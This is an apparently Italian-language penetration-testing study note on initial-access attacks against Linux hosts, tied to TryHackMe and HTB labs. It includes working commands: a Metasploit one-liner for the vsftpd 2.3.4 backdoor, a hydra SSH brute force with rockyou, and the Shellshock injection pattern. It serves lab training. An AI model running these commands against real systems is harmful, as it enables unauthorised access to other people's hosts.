# Linux Host Attacks

**Difficolta:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [../00-Fundamentals/03-Linux-Fundamentals.md](../00-Fundamentals/03-Linux-Fundamentals.md)
**Lab:** INE PTS labs / TryHackMe — Vulnversity, HTB — Lame

---

## Obiettivo

Attaccare servizi e misconfigurazioni tipiche di un host Linux (SSH, servizi di rete datati, permessi errati) per ottenere un primo punto d'appoggio prima della post-exploitation.

---

## Concetti chiave

### Superficie di attacco tipica Linux

| Servizio | Porta | Rischio comune |
|----------|-------|------------------|
| SSH | 22 | brute force, chiavi private deboli/riusate |
| FTP | 21 | anonymous login, versioni con backdoor note (vsftpd 2.3.4) |
| Samba | 139/445 | versioni vulnerabili (es. CVE-2017-7494 "SambaCry") |
| Servizi web | 80/443 | applicazioni datate con CVE pubblici |

### Shellshock (CVE-2014-6271) — cenno storico

Vulnerabilita in Bash che permetteva RCE tramite variabili d'ambiente malformate passate a script CGI (`() { :; }; comando`). Storicamente rilevante, ancora presente in alcuni lab didattici per insegnare il concetto di command injection tramite header HTTP.

### Misconfigurazioni comuni che aprono la porta all'accesso iniziale

| Misconfigurazione | Rischio |
|--------------------|---------|
| Cron job world-writable | un utente non privilegiato puo modificare uno script eseguito da root/altro utente |
| Sudo mal configurato | comandi eseguibili come root senza password o con binari sfruttabili (approfondito in post-exploitation) |
| Chiavi SSH private esposte (backup, share) | accesso diretto senza bisogno di brute force |

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| hydra | `hydra -l user -P wordlist.txt ssh://target` | credenziali valide | vedi [03-Password-Attacks-Hydra-John-Hashcat.md](03-Password-Attacks-Hydra-John-Hashcat.md) |
| searchsploit | `searchsploit samba 4.5` | exploit noti per la versione | vedi [../08-Exploitation-PostEx/01-Manual-Exploitation-Searchsploit.md](../08-Exploitation-PostEx/01-Manual-Exploitation-Searchsploit.md) |
| ssh-keyscan / ssh -v | `ssh -v user@target` | banner e algoritmi supportati | utile per fingerprint versione OpenSSH |

---

## Payload / Esempi

### Esempio 1: vsftpd 2.3.4 backdoor (case study storico)

```bash
searchsploit vsftpd 2.3.4
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.10.5; run"
```

**Spiegazione:** la versione 2.3.4 di vsftpd distribuita da un mirror compromesso conteneva una backdoor: una connessione con username terminante in `:)` apriva una shell sulla porta 6200. Esempio classico per insegnare l'idea di "versione software = superficie di attacco nota".

### Esempio 2: brute force SSH mirato

```bash
hydra -l www-data -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5 -t 4
```

**Output atteso:**
```
[22][ssh] host: 10.10.10.5   login: www-data   password: letmein123
```

**Spiegazione:** SSH tollera pochi tentativi paralleli prima di rallentare/bloccare; `-t 4` mantiene il brute force sotto controllo evitando falsi negativi per timeout.

### Esempio 3: chiave SSH privata trovata su uno share/backup

```bash
chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.5
```

**Spiegazione:** se una chiave privata viene trovata durante l'enumeration (es. in un backup su FTP/NFS/SMB), i permessi vanno ristretti (`600`) altrimenti SSH rifiuta di usarla; e spesso la via di accesso piu diretta, va sempre controllata prima del brute force.

---

## Lab Hands-On

### Lab 1: TryHackMe — Vulnversity (sezione servizi Linux)
**Obiettivo:** enumerare e sfruttare un servizio Linux vulnerabile per ottenere accesso iniziale
**Difficulty:** Facile
**Time:** 40 min

**Walkthrough breve:**
1. Enumera tutti i servizi con nmap -sV -sC
2. Cerca exploit pubblici per ogni versione identificata con searchsploit
3. Ottieni una shell iniziale e verifica l'utente corrente

---

## Common Mistakes

- Saltare l'enumerazione della versione esatta -> impossibile trovare l'exploit giusto con searchsploit
- Non controllare permessi/chiavi trovate durante l'enumeration prima del brute force -> si perde tempo su un attacco piu lento quando esisteva gia un accesso diretto
- Brute force SSH aggressivo senza throttling -> falsi negativi per timeout o rate limiting del servizio

---

## Link Utili

- [vsftpd 2.3.4 backdoor advisory](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [Exploit-DB](https://www.exploit-db.com/)

---

## Connessioni

- **Prerequisito:** [../00-Fundamentals/03-Linux-Fundamentals.md](../00-Fundamentals/03-Linux-Fundamentals.md)
- **Prossimo Step:** [03-Password-Attacks-Hydra-John-Hashcat.md](03-Password-Attacks-Hydra-John-Hashcat.md)
- **Combinazione con:** [../08-Exploitation-PostEx/04-Privilege-Escalation-Linux.md](../08-Exploitation-PostEx/04-Privilege-Escalation-Linux.md)

---

## Checklist di padronanza

- [ ] So identificare e sfruttare servizi Linux con exploit pubblici noti
- [ ] So eseguire un brute force SSH mirato e controllato
- [ ] So riconoscere e usare chiavi SSH trovate durante l'enumeration
- [ ] Conosco a livello concettuale Shellshock e le misconfigurazioni cron/sudo piu comuni

---

## Note personali

_(spazio libero)_
